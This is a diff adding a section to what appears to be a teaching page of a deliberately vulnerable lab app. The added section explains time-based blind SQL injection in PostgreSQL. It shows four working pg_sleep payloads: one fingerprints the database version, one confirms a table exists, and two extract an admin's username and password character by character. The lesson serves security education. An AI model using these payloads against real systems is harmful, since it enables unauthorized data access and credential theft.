@@ -37,6 +37,32 @@
       user's password at a time) and the response time itself becomes the leaked signal,
       one true/false bit per request.</li>
 </ol>
+<p>
+  From there, the same conditional-sleep idiom extracts anything the database user can
+  read, one true/false answer at a time:
+</p>
+<ul>
+  <li>
+    Confirm the database engine and version:
+    <br>
+    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT version()) LIKE 'PostgreSQL 1%' THEN 5 ELSE 0 END)))=1-- </code>
+  </li>
+  <li>
+    Confirm a specific table exists, without ever seeing its contents directly:
+    <br>
+    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='injection_accounts')=1 THEN 5 ELSE 0 END)))=1-- </code>
+  </li>
+  <li>
+    Extract a username one character at a time:
+    <br>
+    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT substring(username,1,1) FROM injection_accounts WHERE is_admin=true)='a' THEN 3 ELSE 0 END)))=1-- </code>
+  </li>
+  <li>
+    Extract that account's password one character at a time, the exact same way:
+    <br>
+    <code>nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT substring(password,1,1) FROM injection_accounts WHERE username='admin')='s' THEN 3 ELSE 0 END)))=1-- </code>
+  </li>
+</ul>
 <p class="text-muted">
   Note: <code>pg_sleep</code> is PostgreSQL-specific — this timing behavior only shows up
   when running against the real Postgres-backed app under <code>docker compose up</code>,
